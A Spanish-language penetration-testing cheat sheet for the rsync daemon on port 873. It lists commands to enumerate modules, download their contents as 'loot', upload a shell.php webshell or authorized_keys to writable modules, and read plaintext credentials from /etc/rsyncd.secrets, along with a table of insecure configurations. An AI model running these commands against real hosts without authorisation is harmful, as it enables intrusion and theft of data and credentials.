---
tipo: meta
aliases:
  - rsync - matriz
  - rsync cheatsheet
tags:
  - meta/referencia
  - dominio/red
---

# rsync - matriz de referencia

> [!info] Referencia pura, no un zettel
> **Puerto: 873/tcp** (demonio rsync). Ataque del **servicio**: listar módulos, bajar y —si es escribible— subir. Muy seguido está **anónimo** por mala config. Distinto de `rsync -e ssh`, que es solo transferencia sobre el 22 ([[Transferencia de archivos - matriz de referencia]]). Criterio de recon en [[MOC - Reconocimiento de red]].

`HOST` es el objetivo; `MOD` un módulo (el "share" de rsync). Dos sintaxis equivalentes: `rsync://HOST/MOD/` y `HOST::MOD/`.

## Reconocimiento

| Comando | Qué da |
|---|---|
| `nc -nv HOST 873` | Banner del demonio (`@RSYNCD: <versión>`) |
| `nmap -sV --script "rsync-list-modules" -p873 HOST` | Versión y **lista de módulos** |

## Listar

| Tarea | Comando |
|---|---|
| Módulos disponibles | `rsync -av --list-only rsync://HOST/` (o `rsync HOST::`) |
| Contenido de un módulo | `rsync -av --list-only rsync://HOST/MOD/` |

Un módulo que lista sin pedir credencial es acceso anónimo — el caso jugoso.

## Descargar y subir

| Tarea | Comando |
|---|---|
| Bajar todo el módulo | `rsync -av rsync://HOST/MOD/ ./loot/` |
| Bajar un archivo | `rsync -av rsync://HOST/MOD/ruta/archivo ./` |
| Subir (si es escribible) | `rsync -av ./shell.php rsync://HOST/MOD/` |

Si el módulo es escribible y apunta a un webroot o a `~/.ssh/`, subir una webshell o una `authorized_keys` es acceso directo — el mayor impacto del servicio.

## Autenticar

Cuando el módulo pide usuario:

| Forma | Comando |
|---|---|
| Interactivo | `rsync -av rsync://usuario@HOST/MOD/ ./` (pide contraseña) |
| Sin prompt | `RSYNC_PASSWORD='p' rsync -av rsync://usuario@HOST/MOD/ ./` |
| Con archivo | `rsync -av --password-file=pass.txt rsync://usuario@HOST/MOD/ ./` |

## Configuración (con acceso al host)

| Archivo | Qué tiene |
|---|---|
| `/etc/rsyncd.conf` | Módulos: `path`, `read only`, `auth users`, `hosts allow` |
| `/etc/rsyncd.secrets` | **`usuario:contraseña` en texto plano** de los módulos — loot directo |

### Configuraciones peligrosas

| Config | Por qué importa |
|---|---|
| Módulo sin `auth users` | Acceso **anónimo** al `path` |
| `read only = no` | Escritura → webshell / `authorized_keys` |
| `path = /` o `/home` | Expone el filesystem o los homes enteros |
| Falta `hosts allow` | Acepta desde cualquier IP |

## Errores frecuentes

| Síntoma | Causa | Salida |
|---|---|---|
| `@ERROR: access denied` | módulo con `auth users` | conseguir credencial (`rsyncd.secrets`), o probar otro módulo |
| `@ERROR: chdir failed` | el `path` del módulo no existe | probar otro módulo |
| `password file must not be other-accessible` | permisos del `--password-file` | `chmod 600 pass.txt` |
| no lista nada | 873 filtrado o sin módulos anónimos | confirmar el puerto; probar con credencial |
